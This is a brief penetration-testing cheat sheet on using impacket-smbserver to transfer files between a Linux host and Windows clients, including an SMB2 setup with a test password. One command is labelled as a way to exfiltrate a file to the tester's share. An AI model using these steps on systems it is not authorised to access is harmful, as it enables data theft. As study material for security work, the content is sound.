# File Transfer with SMB Server

## Simple SMB Server

With `impacket-smbserver`:

```
sudo impacket-smbserver [SHARE_NAME] [PATH_TO_SHARE]
```

E.g. to server current directory:

```
sudo impacket-smbserver share .
```

To copy from the share to a Windows client:

```
copy \\[IP]\share\file
```

To copy to the share (i.e. exfiltrate a file):

```
copy [FILE] \\[IP]\share
```

## SMB 2 With Password

If you receive this message when connecting to an SMB server:

```
You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which is unsafe and could expose your system to attack.
Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?linkid=852747
```

You can start an SMB server in SMB 2.0 mode with a password:

```
$ impacket-smbserver share . -smb2support -username test -password test
```

To connect to the share, run:

```
net use z: \\[IP]\share /u:test test
```

Download/upload as normal:

```
copy file \\[IP]\share
```